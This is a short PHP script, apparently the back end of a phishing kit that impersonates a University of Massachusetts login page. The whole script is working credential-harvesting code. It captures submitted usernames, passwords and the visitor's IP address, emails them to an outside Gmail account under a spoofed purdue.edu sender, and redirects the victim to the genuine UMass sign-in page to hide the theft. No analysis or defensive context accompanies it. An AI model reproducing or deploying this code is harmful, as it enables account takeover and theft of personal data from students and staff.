<?
$ip = getenv("REMOTE_ADDR");
$message .= "Login: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$send = "miraiexploits@gmail.com";
$subject = "umas logs";
$headers = "From: umas<noreply@purdue.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message, $headers); 
header("Location: https://appauth.umass.edu/idp/profile/SAML2/Redirect/SSO?execution=e1s1");
	  

?>